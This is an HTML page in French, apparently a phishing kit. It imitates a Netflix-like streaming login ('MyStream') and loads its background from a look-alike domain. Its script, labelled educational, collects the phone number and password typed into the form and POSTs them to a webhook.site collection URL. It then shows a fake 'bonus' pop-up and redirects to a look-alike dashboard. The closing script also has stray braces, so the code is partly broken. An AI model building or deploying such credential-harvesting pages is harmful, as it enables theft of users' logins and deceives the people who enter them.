<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>MyStream - Connexion</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #000;
      color: #fff;
    }

    /* Hero background */
    .hero {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: url("https://nesflix.uk/bgimage.jpg") center/cover no-repeat;
      position: relative;
    }
    .hero::before {
      content: "";
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.65);
    }

    /* Contenu */
    .hero-content {
      position: relative;
      text-align: center;
      z-index: 2;
      margin-bottom: 20px;
    }
    .brand {
      color: #e50914;
      font-size: 2rem;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .subtitle {
      font-size: 1rem;
      font-weight: normal;
      margin: 0;
      color: #ddd;
    }

    /* Card login */
    .login-card {
      position: relative;
      z-index: 2;
      width: 320px;
      background: rgba(0, 0, 0, 0.75);
      padding: 30px 20px;
      border-radius: 8px;
    }
    .login-card h2 {
      margin: 0 0 20px;
      text-align: center;
      font-size: 1.3rem;
    }
    .input-group {
      display: flex;
      align-items: center;
      background: #333;
      border-radius: 4px;
      padding: 12px;
      margin-bottom: 15px;
      position: relative;
    }
    .input-group svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
      fill: #aaa; /* gris clair */
    }
    .input-group input {
      background: transparent;
      border: none;
      outline: none;
      color: #fff;
      margin-left: 10px;
      flex: 1;
      font-size: 1rem;
    }
    .input-group input::placeholder {
      color: #888;
    }

    /* Icône œil */
    .eye-icon {
      position: absolute;
      right: 12px;
      cursor: pointer;
    }
    .eye-icon svg {
      width: 20px;
      height: 20px;
      fill: #888; /* gris clair */
    }

    /* Bouton */
    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      background: #e50914;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      margin: 20px 0 10px;
    }

    /* Footer card */
    .card-footer {
      text-align: center;
      font-size: 0.9rem;
      color: #ccc;
    }
    .card-footer a {
      color: #e50914;
      text-decoration: none;
      font-weight: bold;
    }

    /* Footer bas */
    .site-footer {
      position: relative;
      z-index: 2;
      text-align: center;
      color: rgba(255, 255, 255, 0.7);
      font-size: 0.8rem;
      padding: 30px 10px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <main class="hero">
    <div class="hero-content">
      <div class="brand">MYSTREAM</div>
      <p class="subtitle">Connectez-vous avec votre numéro de téléphone</p>
    </div>

    <section class="login-card">
      <h2>Se connecter</h2>
      <form>
        <!-- Téléphone -->
        <div class="input-group">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 1H7a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2zm0 18H7V5h10v14z"/></svg>
          <input type="tel" placeholder="Numéro de téléphone">
        </div>
        <!-- Mot de passe -->
        <div class="input-group">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 8h-1V6a4 4 0 1 0-8 0v2H7a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-5 8a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3-8H9V6a3 3 0 0 1 6 0v2z"/></svg>
          <input type="password" placeholder="Mot de passe">
          <span class="eye-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9z"/></svg>
          </span>
        </div>
        <button class="btn">Se connecter</button>
      </form>
      <div class="card-footer">
        Vous n'avez pas de compte ? <a href="#">S'inscrire maintenant</a>
      </div>
    </section>

    <footer class="site-footer">
      © 2025 MyStream International. Tous droits réservés.
    </footer>
  </main>

  <!-- Script pédagogique -->
  <script>
  document.querySelector("form").addEventListener("submit", function(e) {
    e.preventDefault();

    const tels = document.querySelector('input[type="tel"]').value;
    const passwords = document.querySelector('input[type="password"]').value;

    fetch("https://webhook.site/f8b07a2b-efd2-4812-bb67-972dc0912b4f", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify({
        tels: tels,
      passwords: passwords
      })
    })
    .then(() => alert("Données envoyées au webhook !"))
    .catch(err => console.error("Erreur :", err));
  });
     // Pop-up d'information
    alert("Le bonus sera transféré dans les 48h");

    // Redirection
    window.location.href = "https://nesflix.uk/dashboard";
  });
  </script>
</body>
</html>
